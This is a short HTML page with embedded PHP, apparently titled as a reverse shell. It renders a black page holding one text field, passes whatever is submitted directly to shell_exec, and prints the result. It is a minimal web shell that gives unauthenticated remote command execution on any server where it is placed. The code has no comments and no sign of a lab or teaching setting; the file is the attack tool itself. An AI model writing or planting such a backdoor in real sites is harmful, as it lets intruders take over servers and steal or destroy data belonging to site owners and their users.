<!DOCTYPE html>
<html>
<head>

<style>

    body{
        background-color: black;
    }
    #input{
        margin: 20px auto; 
        width: 400px;
        height: 30px;
        background-color: white;
        color: black;
    }
    #output{
        margin: 20px auto; 
        width: 400px;
        height: 500px;
        background-color: white;
        color: black;
    }

</style>
</head>
<body>
    <section>
        <div id="input">
            <form action="/reverse_shell.php" method="POST">
                <input type="text" name="command" id="command">
                <input type="submit">
            </form>
        </div>
        <div id="output">
            <?php
                $command = $_POST["command"];
                $output = shell_exec($command);
                echo $output;
            ?>
        </div>
    </section>
</body>

</html>
